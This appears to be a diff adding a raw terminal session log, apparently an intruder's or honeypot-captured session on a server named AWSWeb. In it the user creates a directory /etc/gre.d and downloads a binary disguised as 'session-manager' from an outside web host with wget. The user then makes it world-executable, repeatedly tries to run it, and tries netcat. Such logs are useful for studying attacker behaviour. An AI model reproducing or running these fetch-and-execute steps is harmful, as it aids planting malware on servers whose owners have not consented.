@@ -1,0 +1,76 @@
+[4hAWSWeb:~# ls
+[4l[4hAWSWeb:~# cd /etc
+[4l[4hAWSWeb:/etc# ls
+[4lservices               magic.mime             network                
+python2.5              adjtime                mailcap                
+shadow-                modules                debian_version         
+ld.so.conf.d           passwd                 localtime              
+hosts                  rc4.d                  rcS.d                  
+logrotate.d            securetty              mtab                   
+mime.types             sysctl.d               environment            
+inputrc                initramfs-tools        modprobe.d             
+debconf.conf           security               vim                    
+ssh                    resolv.conf            skel                   
+gshadow-               dpkg                   udev                   
+scsi_id.config         rc6.d                  ld.so.cache            
+rc5.d                  apt                    networks               
+opt                    group                  inittab                
+issue                  default                issue.net              
+mailcap.order          dhcp3                  pam.conf               
+hosts.deny             rc.local               python                 
+nsswitch.conf          rsyslog.conf           wgetrc                 
+motd.tail              mke2fs.conf            rc1.d                  
+sysctl.conf            rmt                    ld.so.conf             
+group-                 rc3.d                  adduser.conf           
+init.d                 hosts.allow            gshadow                
+cron.daily             alternatives           hostname               
+bash.bashrc            rc0.d                  pam.d                  
+gai.conf               timezone               deluser.conf           
+lsb-base               passwd-                rpc                    
+magic                  kernel-img.conf        motd                   
+shadow                 protocols              bash_completion.d      
+host.conf              rc2.d                  profile                
+X11                    bindresvport.blacklist rsyslog.d              
+fstab                  login.defs             shells                 
+terminfo               
+[4hAWSWeb:/etc# /etc/gre.d/[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1Dcd 
+[4lbash: cd: /etc/gre.d/: No such file or directory
+[4hAWSWeb:/etc# mkdir gre.;d[1D[1P[1D[1Pd
+[4l[4hAWSWeb:/etc# [Kmkdir gre.d[11D[Kcd /etc/gre.d/
+[4l[4hAWSWeb:/etc/gre.d# ls
+[4l[4hAWSWeb:/etc/gre.d# wget
+[4lwget: missing URL
+Usage: wget [OPTION]... [URL]...
+
+Try `wget --help' for more options.
+[4hAWSWeb:/etc/gre.d# wget ftp://dsiaba@ftp.xpg.com.br/lolinho/session-manager[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1C[1C[1C[1C[1D[1P[1D[1P[1D[1P[1D[1P[1D[1D[1D[1D[1D[1D[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pwww.
+[4l--2013-02-07 21:54:31--  http://www.dsiaba.xpg.com.br/lolinho/session-manager
+Connecting to www.dsiaba.xpg.com.br:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 114876 (112K) [application/octet-stream]
+Saving to: `session-manager
+
+ 1% [>                                      ] 1,193        1K/s  eta 1m 2s17% [======>                                ] 20,173       15K/s  eta 6s  77% [==============================>        ] 88,793       43K/s  eta 0s100%[======================================>] 114,876      43K/s
+
+2013-02-07 21:54:33 (43 KB/s) - `session-manager' saved [114876/114876]
+[4hAWSWeb:/etc/gre.d# ls
+[4lsession-manager 
+[4hAWSWeb:/etc/gre.d# chmod 01[1D[1P777 sessio[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pchmod 0777 session-manager 
+[4l[4hAWSWeb:/etc/gre.d# ./sessi[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P./session-manager 
+bash: ./session-manager: command not found
+AWSWeb:/etc/gre.d# ls
+[4lsession-manager 
+[4hAWSWeb:/etc/gre.d# sessio[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Psession-manager 
+bash: session-manager: command not found
+AWSWeb:/etc/gre.d# bash se[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pbash session-manager [1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Pbash session-manager 
+[4l[4hAWSWeb:/etc/gre.d# ./sessio[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P./session-manager 
+bash: ./session-manager: command not found
+AWSWeb:/etc/gre.d# [K./session-manager [1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1D[1C[1Cetc[1D[1P[1D[1P[1D[1P[1D[1P[1D[1Psession-manager [1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P[1D[1P
+AWSWeb:/etc/gre.d# 
+AWSWeb:/etc/gre.d# ./etc/gred[1D[1P.d/session-manager
+bash: ./etc/gre.d/session-manager: command not found
+AWSWeb:/etc/gre.d# nc
+bash: nc: command not found
+AWSWeb:/etc/gre.d# exit
+[4lcConnection to server closed.
+[4hlocalhost:~# 
